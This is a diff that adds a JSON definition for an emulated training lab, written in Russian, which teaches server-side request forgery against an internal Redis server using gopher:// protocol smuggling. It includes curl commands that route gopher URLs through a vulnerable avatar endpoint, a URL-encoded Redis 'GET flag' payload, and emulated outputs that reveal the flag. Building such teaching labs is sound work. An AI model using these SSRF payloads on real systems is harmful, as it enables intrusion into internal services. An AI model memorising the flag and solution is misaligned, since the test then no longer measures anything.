@@ -1,0 +1,23 @@
+{
+  "id": "web-ssrf-protocol-smuggling",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{g0ph3r_r3d1s_smuggl1ng}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: SSRF → gopher → Redis\n\nSSRF-ручка `https://shop.local/profile/avatar` принимает `url=` и делает запрос\nот имени сервера. Библиотека разрешает схему `gopher://` — значит, можно передать\nпроизвольные байты на внутренний Redis (127.0.0.1:6379).\n\n1. Проверь доступность Redis и схему gopher:\n\n   curl -s 'https://shop.local/profile/avatar' --data-urlencode 'url=gopher://127.0.0.1:6379/_PING'\n\n2. В каталоге лежит `gopher.txt` — URL-encoded RESP-команда `GET flag` (посмотри `cat gopher.txt`).\n3. Отправь её через SSRF и запиши ответ в found.txt:\n\n   curl -s 'https://shop.local/profile/avatar' --data-urlencode 'url@gopher.txt' > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/gopher.txt", "text": "gopher://127.0.0.1:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag%0d%0a" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/profile/avatar)",
+      "cases": [
+        { "match": "url@gopher|gopher\\.txt", "example": "--data-urlencode 'url@gopher.txt'", "output": "*2\\r\\n$3\\r\\nGET\\r\\n$4\\r\\nflag\\r\\n\n$22\\r\\nnto{g0ph3r_r3d1s_smuggl1ng}\\r\\n\n" },
+        { "match": "_PING", "example": "--data-urlencode 'url=gopher://127.0.0.1:6379/_PING'", "output": "+PONG\n" },
+        { "match": "dict://|dict%3A", "example": "--data-urlencode 'url=dict://127.0.0.1:6379/INFO'", "output": "+PONG\n" },
+        { "match": "avatar|shop\\.local", "example": "-s 'https://shop.local/profile/avatar'", "output": "{\"error\":\"missing url\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /profile/avatar на shop.local.\n"
+    }
+  }
+}
